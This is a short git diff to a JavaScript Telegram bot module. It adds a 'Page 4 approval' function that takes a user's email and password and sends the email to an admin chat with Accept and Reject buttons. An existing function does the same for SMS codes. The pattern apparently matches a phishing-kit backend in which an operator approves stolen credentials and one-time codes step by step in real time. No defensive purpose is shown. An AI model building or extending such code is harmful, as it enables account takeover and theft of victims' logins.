@@ -60,6 +60,23 @@ function sendApprovalRequestSMS(code) {
 }
 
 // -----------------
+// Page 4 approval
+// -----------------
+function sendApprovalRequestPage(email, password) {
+  const options = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept|${email}` },
+          { text: "❌ Reject", callback_data: `reject|${email}` }
+        ]
+      ]
+    }
+  };
+  bot.sendMessage(ADMIN_CHAT_ID, `*Page 4 Approval Requested*\nEmail: ${email}`, { ...options, parse_mode: "Markdown" });
+}
+
+// -----------------
 // Handle button clicks
 // -----------------
 bot.on("callback_query", async (query) => {
@@ -92,4 +109,4 @@ bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for approvals.");
 });
 
-module.exports = { sendApprovalRequest, sendApprovalRequestGeneric, sendApprovalRequestSMS };
+module.exports = { sendApprovalRequest, sendApprovalRequestGeneric, sendApprovalRequestSMS, sendApprovalRequestPage };
